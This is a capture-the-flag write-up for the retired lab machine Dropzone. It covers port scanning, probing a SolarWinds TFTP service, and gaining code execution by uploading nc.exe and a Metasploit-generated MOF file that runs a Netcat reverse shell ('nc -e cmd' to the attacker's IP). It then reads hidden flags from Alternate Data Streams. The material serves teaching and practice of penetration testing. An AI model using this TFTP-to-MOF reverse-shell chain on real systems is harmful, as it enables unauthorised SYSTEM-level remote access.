# Dropzone

This is the write-up for the box Dropzone that got retired at the 3rd November 2018.
My IP address was 10.10.14.2 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.90    dropzone.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/dropzone.nmap 10.10.10.90
```

```markdown
All 1000 scanned ports on 10.10.10.90 are filtered
```

UDP port scan:
```markdown
nmap -sU -o nmap/dropzone_udp.nmap 10.10.10.90
```
```markdown
PORT   STATE SERVICE
69/udp open  tftp
```

Scanning port 69 with default scripts:
```markdown
nmap -sC -sV -sU -p 69 10.10.10.90
```
```markdown
PORT   STATE SERVICE VERSION
69/udp open  tftp    SolarWinds Free tftpd
```

## Checking TFTP (Port 69)

We can connect to the TFTP service:
```markdown
tftp 10.10.10.90
```

There is no way to see what files are hosted, but by trying out anything, it shows the root path and in this case it is _C:_.
```markdown
tftp> get abcd
Error code 1: Could not find file 'C:\abcd'.
```

By trying some default Windows directories and filenames, we can try to get _C:/Windows_ and this time access is denied:
```markdown
tftp> get /windows
Error code 1: Access to the path 'C:\windows' is denied.
```

When trying to download the **SAM** file, it does not deny access, but its not working because it is used by another process:
```markdown
tftp> get /windows/system32/config/sam  
Error code 1: The process cannot access the file 'C:\windows\system32\config\sam' because it is being used by another process.
```

The SAM file can only be accessed by the _SYSTEM_ user and as access is not denied, it seems like that this service is running as with high privileges.

The service does not know the home directory _C:\Users_ that is default since **Windows 7** which could indicate that this box is older than that:
```markdown
tftp> get /users
Error code 1: Could not find file 'C:\users'.
```

In **Windows XP** the default home directories are in _C:\Documents and Settings_.
This can be verified by using an old method of accessing long filenames:
```markdown
tftp> get /DOCUME~1
Error code 1: Access to the path 'C:\Documents and Settings' is denied.
```

It is possible to find out if the machine is 32-bit or 64-bit by trying to access the directories with the installed programs:
```markdown
tftp> get /PROGRA~1
Error code 1: Access to the path 'C:\Program Files' is denied.
tftp> get /PROGRA~2
Error code 1: Could not find file 'C:\PROGRA~2'.
```

It only found _C:\Program Files_ and that confirms that this is a **Windows XP 32-bit** box.

## Exploiting Managed Object Format (MOF)

The module of **Metasploits PSexec** has three ways to execute code remotely on a Windows client:
- PowerShell upload
- Native upload
- MOF upload

These functions can be found in the Ruby scripts in the Metasploit directory:
- _/usr/share/metasploit-framework/modules/exploits/windows/smb/psexec.rb_
- _/usr/share/metasploit-framework/lib/msf/core/exploit/smb/client/psexec.rb_

The first two ways will not work because the SMB service is closed, but the third way **MOF upload** does not need any other service.
It stands for [Managed Object Format](https://docs.microsoft.com/en-us/windows/win32/wmisdk/managed-object-format--mof-) and is a language to describe **CIM** and **WMI** classes.

We can generate our own MOF file with **Metasploit**:
```markdown
use exploit/windows/smb/psexec

irb
```

The `irb` command jumps into the _interactive Ruby command line_ where it is possible to execute functions from the scripts.
```markdown
puts generate_mof("MOFtest", "FILEtest")
```

This generates the code for the MOF file that will be compiled into the WMI database. It has to be modified accordingly and the finished code can be found in this repository as _dropzone_mof.mof_. The code is executing a **Netcat** reverse shell:
```markdown
nc -e cmd 10.10.14.2 9001
```

Uploading `nc.exe` to the box via TFTP:
```markdown
tftp> mode binary
tftp> put nc.exe /windows/system32/nc.exe
Sent 59392 bytes in 6.0 seconds
```

Uploading the MOF file _dropzone_mof.mof_ to _/windows/system32/wbem/mof/_ where it will be automatically executed:
```markdown
tftp> put dropzone_mof.mof /windows/system32/wbem/mof/dropzone_mof.mof
```

After uploading the MOF file, it gets executed and the listener on my IP and port 9001 starts a reverse shell connection.
The home folder _C:\Documents and Settings\Administrator_ is accessible to get the _root.txt_ but it has not the flag:
```markdown
It's easy, but not THAT easy...
```

## Getting the root flag

There is a file in _C:\Documents and Settings\Administrator\flags_ called _"2 for the price of 1!.txt"_ that says the following:
```markdown
For limited time only!

Keep an eye on our ADS for new offers & discounts!
```

The **ADS** is a hint for **Alternate Data Streams** that are used to hide files.
To get the contents out of a data stream, the [Sysinternals tool Streams](https://docs.microsoft.com/en-us/sysinternals/downloads/streams) will be used.

Uploading _streams.exe_ via TFTP:
```markdown
tftp> mode binary
tftp> put streams.exe /windows/system32/streams.exe
Sent 342392 bytes in 33.1 seconds
```

Reading the hidden content from the file:
```markdown
streams "2 for the price of 1!.txt"
```

The flags of _user.txt_ and _root.txt_ are shown!
